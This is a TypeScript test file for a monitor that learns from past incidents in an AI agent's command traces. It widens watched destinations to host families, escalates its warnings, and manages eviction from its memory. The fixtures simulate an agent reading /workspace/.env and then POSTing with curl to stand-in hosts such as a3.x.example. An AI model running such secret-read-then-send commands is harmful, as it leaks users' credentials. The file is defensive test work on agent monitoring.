// Incidents, and the lessons drawn from them.
//
// An incident is one thing that happened: stopped sending to a1.x.example after
// reading a file. A lesson is what several incidents add up to — "anything under
// x.example" — which no single incident states. The fold is where one becomes the
// other, and corroboration is the only thing that promotes it.
//
// Nothing here needs an Agent. A reflection is a record, so a hundred mistakes is
// a fixture rather than a hundred runs.

import { describe, expect, it } from "vitest";
import { learnedWatchCheck } from "../../src/check-learned-watch.js";
import {
  DEFAULT_CAP,
  MIN_ONE_OFF,
  evict,
  familyOf,
  paramsFrom,
  tierOf,
  withdraw,
  type Reflection,
} from "../../src/reflections.js";
import type { TraceRecord } from "../../src/trace.js";
import { NOW, incident, rotation } from "./fixtures.js";

const families = (reflections: Reflection[]): string[] =>
  paramsFrom(reflections)
    .watchedDestinations.filter((watched) => watched.family === true)
    .map((watched) => watched.value);

/** A run that reads a secret, then sends to `host`. */
function egressTrace(host: string): TraceRecord[] {
  const at = "2026-08-29T00:00:00.000Z";
  return [
    {
      seq: 1,
      at: at,
      dir: "in",
      method: "item/completed",
      payload: {
        params: {
          item: {
            id: "r1",
            type: "commandExecution",
            command: "cat /workspace/.env",
            commandActions: [{ type: "read", path: "/workspace/.env" }],
          },
        },
      },
    },
    {
      seq: 2,
      at: at,
      dir: "in",
      method: "item/started",
      payload: {
        params: {
          item: {
            id: "c1",
            type: "commandExecution",
            command: `curl -X POST https://${host}/x`,
            commandActions: [],
          },
        },
      },
    },
  ];
}

const watchFor = (reflections: Reflection[]) =>
  learnedWatchCheck({ learned: paramsFrom(reflections) });

describe("familyOf", () => {
  it("widens a host to everything under its parent", () => {
    expect(familyOf("a1.deploy.internal.example")).toBe("deploy.internal.example");
  });

  it("never widens a two-label host, which would mean the whole public suffix", () => {
    expect(familyOf("attacker.com")).toBeNull();
  });

  it("never widens an IPv4 address, which has no parent", () => {
    expect(familyOf("10.1.2.3")).toBeNull();
  });
});

describe("lessons: rotation", () => {
  it("does not widen on a single incident", () => {
    // The Agent has been stopped once. That is not evidence of rotation, and a
    // warn now steers, so widening here would nudge it away from legitimate work
    // on every future run.
    expect(families([incident({ destination: "a1.x.example" })])).toEqual([]);
  });

  it("widens once two hosts under one parent have been stopped", () => {
    const memory = [
      incident({ destination: "a1.x.example" }),
      incident({ destination: "a2.x.example" }),
    ];
    expect(families(memory)).toEqual(["x.example"]);
  });

  it("catches a third, never-seen host in the family", () => {
    const memory = [
      incident({ destination: "a1.x.example" }),
      incident({ destination: "a2.x.example" }),
    ];
    const findings = watchFor(memory).run(egressTrace("a3.x.example"));

    expect(findings.map((finding) => finding.code)).toContain("watched-destination");
    expect(findings[0]?.severity).toBe("warn");
    expect(findings[0]?.steer).toContain("x.example");
  });

  it("leaves an unrelated host alone", () => {
    const memory = [
      incident({ destination: "a1.x.example" }),
      incident({ destination: "a2.x.example" }),
    ];
    expect(watchFor(memory).run(egressTrace("a1.other.example"))).toEqual([]);
  });

  it("does not match a lookalike that only shares a suffix without the dot", () => {
    const memory = [
      incident({ destination: "a1.x.example" }),
      incident({ destination: "a2.x.example" }),
    ];
    expect(watchFor(memory).run(egressTrace("evil-x.example"))).toEqual([]);
  });

  it("does not merge hosts learned under different preconditions", () => {
    const memory = [
      incident({ destination: "a1.x.example", precondition: "sensitive-read" }),
      incident({ destination: "a2.x.example", precondition: "encoded-blob" }),
    ];
    expect(families(memory)).toEqual([]);
  });

  it("catches contact with the family in a run where no secret was read", () => {
    // The case the family rule exists for. sensitive-egress is silent here —
    // nothing sensitive was read, so its read-then-egress route never fires — and
    // memory is the only thing that speaks. Inheriting the incidents'
    // precondition would have made this silent too.
    const memory = [
      incident({ destination: "a1.x.example" }),
      incident({ destination: "a2.x.example" }),
    ];
    const noSecret: TraceRecord[] = [
      {
        seq: 1,
        at: NOW,
        dir: "in",
        method: "item/started",
        payload: {
          params: {
            item: {
              id: "c1",
              type: "commandExecution",
              command: "curl -X POST https://a3.x.example/x",
              commandActions: [],
            },
          },
        },
      },
    ];

    const findings = watchFor(memory).run(noSecret);
    expect(findings.map((finding) => finding.code)).toEqual(["watched-destination"]);
    expect(findings[0]?.severity).toBe("warn");
  });

  it("collapses a hundred rotations into one lesson", () => {
    // The point of derivation: memory gets smaller as it learns more.
    expect(families(rotation("x.example", 100))).toEqual(["x.example"]);
  });

  it("collapses back to exact matching when a sibling is withdrawn", () => {
    // The lesson is a pure function of current memory, never stored, so removing
    // the evidence removes the conclusion.
    const memory = [
      incident({ destination: "a1.x.example" }),
      incident({ destination: "a2.x.example" }),
    ];
    const after = withdraw(memory, "sensitive-egress", {
      destination: "a2.x.example",
      precondition: "sensitive-read",
    });

    expect(families(after)).toEqual([]);
    expect(watchFor(after).run(egressTrace("a3.x.example"))).toEqual([]);
  });
});

describe("tiers", () => {
  it("is one-off until a second, independent conversation reaches it", () => {
    expect(tierOf(incident({ destination: "a.x.example", threads: ["t1"] }))).toBe("one-off");
    expect(tierOf(incident({ destination: "a.x.example", threads: ["t1", "t2"] }))).toBe(
      "recurring",
    );
  });

  it("counts a record with no threads as recurring, so an upgrade never demotes", () => {
    const legacy: Reflection = {
      code: "sensitive-egress",
      facts: { destination: "a.x.example", precondition: "sensitive-read" },
      sightings: ["run-1"],
      firstSeenAt: NOW,
      lastSeenAt: NOW,
    };
    expect(tierOf(legacy)).toBe("recurring");
  });

  it("does not promote on repeats inside one conversation", () => {
    const sameThread = incident({
      destination: "a.x.example",
      sightings: ["run-1", "run-2", "run-3"],
      threads: ["t1"],
    });
    expect(tierOf(sameThread)).toBe("one-off");
  });

  it("tells the Agent something different once it recurs", () => {
    const once = watchFor([
      incident({ source: "skills/x.md", precondition: "untrusted-source-read", threads: ["t1"] }),
    ]);
    const again = watchFor([
      incident({
        source: "skills/x.md",
        precondition: "untrusted-source-read",
        threads: ["t1", "t2"],
      }),
    ]);

    const read: TraceRecord[] = [
      {
        seq: 1,
        at: NOW,
        dir: "in",
        method: "item/completed",
        payload: {
          params: {
            item: {
              id: "r1",
              type: "commandExecution",
              command: "cat /workspace/skills/x.md",
              commandActions: [{ type: "read", path: "/workspace/skills/x.md" }],
            },
          },
        },
      },
    ];

    const mild = once.run(read)[0];
    const firm = again.run(read)[0];

    expect(mild?.steer).not.toEqual(firm?.steer);
    expect(firm?.steer).toContain("separate conversation");
    // Escalation is wording only. It never earns the right to refuse.
    expect(mild?.severity).toBe("warn");
    expect(firm?.severity).toBe("warn");
  });
});

describe("eviction protects what recurred", () => {
  it("a rotation flood cannot push out a recurring entry", () => {
    const recurring = incident({
      destination: "known.x.example",
      threads: ["t1", "t2"],
      at: "2026-01-01T00:00:00.000Z", // deliberately stale
    });
    const flood = rotation("flood.example", 400, "2026-08-29T00:00:00.000Z");

    const kept = evict([recurring, ...flood], {});

    expect(kept).toContainEqual(recurring);
    expect(kept).toHaveLength(DEFAULT_CAP);
  });

  it("keeps room for new lessons even when recurring entries fill the cap", () => {
    const recurring = Array.from({ length: DEFAULT_CAP }, (_, index) =>
      incident({ destination: `r${index}.x.example`, threads: ["t1", "t2"] }),
    );
    const fresh = rotation("new.example", 20);

    const kept = evict([...recurring, ...fresh], {});
    const oneOffs = kept.filter((reflection) => tierOf(reflection) === "one-off");

    expect(oneOffs).toHaveLength(MIN_ONE_OFF);
    expect(kept).toHaveLength(DEFAULT_CAP);
  });

  it("evicts recurring entries by recency among themselves once they overflow", () => {
    const old = incident({
      destination: "old.x.example",
      threads: ["t1", "t2"],
      at: "2026-01-01T00:00:00.000Z",
    });
    const recent = incident({
      destination: "new.x.example",
      threads: ["t1", "t2"],
      at: "2026-08-29T00:00:00.000Z",
    });

    expect(evict([old, recent], { "sensitive-egress": 1 })).toEqual([recent]);
  });
});
